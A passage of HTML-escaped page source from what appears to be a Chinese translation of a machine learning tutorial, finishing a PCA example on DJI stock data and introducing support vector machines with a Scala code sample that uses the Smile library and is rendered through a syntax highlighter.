&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rangeValue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0021 seconds] --&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/f1162affe69eff0581e975510d979f5b.jpg&quot; width=&quot;600px&quot;&gt;&lt;/p&gt;
&lt;p&gt;现在我们看到，虽然 DJI 的取值范围落在 0.8 与 1.8 之间，而我们的新特征的取值范围落在 -0.5 与 0.5 之间，但两条曲线的趋势符合得很好。学完这个实例，加上段落中对 PCA 的说明，现在你应该学会了 PCA 并能把它应用到你自己的数据中。&lt;/p&gt;
&lt;h2&gt;应用支持向量机（SVM）&lt;/h2&gt;
&lt;p&gt;在我们实际开始应用支持向量机 (SVM) 之前，我会稍微介绍一下 SVM。基本的 SVM 是一个二元分类器，它通过挑选出一个代表数据点之间最大距离的超平面，将数据集分为两部分。一个 SVM 就带有一个所谓的“校正率”值。如果不存在理想分割，则该校正率提供了一个误差范围，允许人们在该范围内找出一个仍尽可能合理分割的超平面。因此，即使仍存在一些令人不快的点，在校正率规定的误差范围内，超平面也是合适的。这意味着，我们无法为每种情形提出一个“标准的”校正率。不过，如果数据中没有重叠部分，则较低的校正率要优于较高的校正率。&lt;/p&gt;
&lt;p&gt;我刚刚说明了作为一个二元分类器的基本 SVM，但是这些原理也适用于具有更多类别的情形。然而，现在我们要继续完成具有 2 种类别的实例，因为仅说明这种情况已经足够了。&lt;/p&gt;
&lt;p&gt;在本例中，我们将完成几个小案例，其中，支持向量机 (SVM) 的表现都胜过其他分离算法如 KNN。这种方法与前几例中的不同，但它能帮你更容易学会怎么使用以及何时使用 SVM。&lt;/p&gt;
&lt;p&gt;对于每个小案例，我们会提供代码、图像、不同参数时的 SVM 运行测试以及对测试结果的分析。这应该使你对输入 SVM 算法的参数有所了解。&lt;/p&gt;
&lt;p&gt;在第一个小案例中，我们将应用高斯核函数，不过在 &lt;a href=&quot;https://github.com/haifengl/smile&quot;&gt;Smile&lt;/a&gt; 库中还有其他核函数。其他核函数可以在&lt;a href=&quot;http://haifengl.github.io/smile/doc/smile/math/kernel/MercerKernel.html&quot;&gt;这里&lt;/a&gt;找到。紧接着高斯核函数，我们将讲述多项式核函数，因为这个核函数与前者有很大的不同。&lt;/p&gt;
&lt;p&gt;我们会在每个小案例中用到下列的基本代码，其中只有构造函数 filePaths 和 svm 随每个小案例而改变。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d0613d1759535332&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
object SupportVectorMachine extends SimpleSwingApplication {


  def top = new MainFrame {
    title = &quot;SVM Examples&quot;
    //File path (this changes per example)
    //文件路径（随案例而改变）
    val trainingPath =  &quot;/users/.../Example Data/SVM_Example_1.csv&quot;
    val testingPath =  &quot;/users/.../Example Data/SVM_Example_1.csv&quot;
    //Loading of the test data and plot generation stays the same
    //加载测试数据，绘图生成代码保持相同
    val trainingData = getDataFromCSV(new File(path))
    val testingData = getDataFromCSV(new File(path))

    val plot = ScatterPlot.plot(    trainingData._1, 
                                    trainingData._2, 
                                    &#39;@&#39;, 
                                    Array(Color.blue, Color.green)
                                )
    peer.setContentPane(plot)

    //Here we do our SVM fine tuning with possibly different kernels
    //此处，我们用可能的不同核函数对SVM进行微调
    val svm = new SVM[Array[Double]](new GaussianKernel(0.01), 1.0,2)
    svm.learn(trainingData._1, trainingData._2)
    svm.finish()

    //Calculate how well the SVM predicts on the training set
    //计算SVM对测试集的预测效果
    val predictions = testingData
        ._1
        .map(x =&amp;gt; svm.predict(x))
        .zip(testingData._2)

    val falsePredictions = predictions
        .map(x =&amp;gt; if (x._1 == x._2) 0 else 1 )

    println(falsePredictions.sum.toDouble / predictions.length  
                    * 100 + &quot; % false predicted&quot;)

    size = new Dimension(400, 400)
  }


  def getDataFromCSV(file: File): (Array[Array[Double]], Array[Int]) = {
    val source = scala.io.Source.fromFile(file)
    val data = source
        .getLines()
        .drop(1)
        .map(x =&amp;gt; getDataFromString(x))
        .toArray

    source.close()
    val dataPoints = data.map(x =&amp;gt; x._1)
    val classifierArray = data.map(x =&amp;gt; x._2)
    return (dataPoints, classifierArray)
  }

  def getDataFromString(dataString: String): (Array[Double], Int) = {
    //Split the comma separated value string into an array of strings
    //把用逗号分隔的数值字符串分解为一个字符串数组
    val dataArray: Array[String] = dataString.split(&#39;,&#39;)

    //Extract the values from the strings
    //从字符串中抽取数值
    val coordinates  = Array( dataArray(0).toDouble, dataArray(1).toDouble)
    val classifier: Int = dataArray(2).toInt

    //And return the result in a format that can later 
    //easily be used to feed to Smile
    //并以一定格式返回结果，使得该结果之后容易输入到Smile中处理
    return (coordinates, classifier)
  }&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-57&quot;&gt;57&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-59&quot;&gt;59&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-60&quot;&gt;60&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-61&quot;&gt;61&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-62&quot;&gt;62&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-63&quot;&gt;63&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-64&quot;&gt;64&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-65&quot;&gt;65&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-66&quot;&gt;66&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-67&quot;&gt;67&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-68&quot;&gt;68&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-69&quot;&gt;69&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-70&quot;&gt;70&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-71&quot;&gt;71&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-72&quot;&gt;72&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d1759535332-73&quot;&gt;73&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-1&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;SupportVectorMachine&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;extends&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;SimpleSwingApplication&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-3&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;MainFrame&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;SVM Examples&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//File path (this changes per example)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//文件路径（随案例而改变）&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingPath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/users/.../Example Data/SVM_Example_1.csv&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testingPath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/users/.../Example Data/SVM_Example_1.csv&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Loading of the test data and plot generation stays the same&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//加载测试数据，绘图生成代码保持相同&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromCSV&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testingData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromCSV&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;ScatterPlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                    &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;@&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
